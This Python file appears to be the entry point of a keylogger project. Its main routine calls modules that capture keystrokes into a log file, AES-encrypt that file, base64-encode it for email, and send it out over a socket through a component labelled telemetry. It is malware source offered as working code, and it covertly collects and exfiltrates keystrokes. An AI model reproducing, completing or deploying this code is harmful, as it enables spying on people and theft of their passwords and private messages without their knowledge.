from collector.key_grab import MainGrabber
from encription.AES_encryptor import AESEncription
from telemetry.sockettelemetry import TargetSocketTelemetry
from encoding.base64_encoder import Base64Encoding
import time
from res.Resources import Res

class Main:
    def __init__(self):
        res_instance = Res()
        self.time_seconds=1
        self.keyloger_file_path=res_instance.resource_path('./target_file_pool/keylog.txt')
        self.encryption_file_path=res_instance.resource_path('./target_file_pool/encrypted_file.bin')
        self.encoded_file_path=res_instance.resource_path('./target_file_pool/encoded_base64_binary_for_email.bin')

    def main_function(self):
        # Key Grabber
        grabber_instance = MainGrabber(self.keyloger_file_path)
        grabber_instance.listner_method()
        time.sleep(self.time_seconds)
        # Encryption
        encryption_instance = AESEncription(self.encryption_file_path,self.keyloger_file_path)
        encryption_instance.encryption_method()
        time.sleep(self.time_seconds)
        #Encoding
        encoding_instance=Base64Encoding()
        encoding_instance.b64_encode_function()
        time.sleep(self.time_seconds)
        # Telemetry
        target_socket_telemetry_instance = TargetSocketTelemetry(self.encoded_file_path)
        target_socket_telemetry_instance.sender()

main = Main()
main.main_function()